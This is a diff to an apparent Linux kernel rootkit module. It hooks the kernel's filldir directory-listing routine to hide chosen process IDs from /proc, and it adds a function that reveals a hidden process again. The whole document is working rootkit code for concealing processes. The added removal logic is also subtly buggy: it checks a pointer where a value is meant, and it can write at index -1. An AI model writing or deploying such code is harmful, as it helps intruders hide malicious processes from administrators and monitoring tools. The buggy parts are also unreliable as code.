@@ -112,22 +112,34 @@ static int device_release(struct inode *inodep, struct file *filep)
     return 0;
 }
 
+// Returns index of item in array
 int in_array(int val, int *arr, int size)
 {
     int i;
     for (i = 0; i < size; i++) {
         if (arr[i] == val) {
-            return 1;
+            return i;
         }
     }
-    return 0;
+    return -1;
+}
+
+void remove_element(int val, int *arr_size)
+{
+    printk(KERN_INFO "rk: arr_size before is %d", *arr_size);
+    if (arr_size > 0) {
+        int idx = in_array(val, pids, *arr_size);
+        pids[idx] = pids[*arr_size-1];
+        (*arr_size)--;    
+    }
+    printk(KERN_INFO "rk: arr_size after is %d", *arr_size);
 }
 
 int rk_filldir(void *buffer, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
     long name_as_int;
     strict_strtol(name, 10, &name_as_int);
-    if (in_array(name_as_int, pids, pid_count))
+    if (in_array(name_as_int, pids, pid_count) > -1)
         return 0;
         
     return orig_filldir(buffer, name, namlen, offset, ino, d_type);
@@ -191,7 +203,11 @@ void hide_proc(const char *pid)
 
 void show_proc(const char *pid)
 {
-    // TODO: implement
+    long pid_as_int;
+    strict_strtol(pid, 10, &pid_as_int);
+    printk(KERN_INFO "rk: pid_count before removal is %d", pid_count);
+    remove_element(pid_as_int, &pid_count);
+    printk(KERN_INFO "rk: pid_count after removal is %d", pid_count);
     printk(KERN_INFO "rk: Revealing pid %s.\n", pid);    
 }
 
